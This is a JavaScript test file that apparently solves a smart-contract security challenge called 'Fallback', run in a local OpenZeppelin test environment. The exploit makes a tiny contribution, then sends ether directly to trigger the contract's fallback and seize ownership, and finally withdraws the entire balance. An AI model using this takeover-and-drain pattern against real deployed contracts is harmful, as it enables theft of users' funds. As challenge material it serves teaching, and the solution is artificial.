const { ether, expectRevert, expectEvent, } = require('@openzeppelin/test-helpers');
const { accounts, contract } = require('@openzeppelin/test-environment');

const Fallback = contract.fromArtifact('Fallback');

const { expect } = require('chai');
const balance = require('@openzeppelin/test-helpers/src/balance');
const send = require('@openzeppelin/test-helpers/src/send');

describe('[Challenge] Fallback', function () {

  const [deployer, attacker, someUser, ...otherAccounts] = accounts;

  before(async function () {
    /** SETUP SCENARIO */
    this.fallback = await Fallback.new({ from: deployer });
  });

  it('Exploit', async function () {
    /** YOUR EXPLOIT GOES HERE */
    await this.fallback.contribute({ from: attacker, value: ether('0.0001') });
    await send.ether(attacker, this.fallback.address, ether('1'));

    this.attackerBeforeBalance = await balance.current(attacker);
    await this.fallback.withdraw({ from: attacker });
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    expect(
      await balance.current(this.fallback.address)
    ).to.be.bignumber.eq('0');

    expect(await balance.current(attacker)).to.be.bignumber.gte(this.attackerBeforeBalance);

    expect(await this.fallback.owner()).eq(attacker);
  });
});
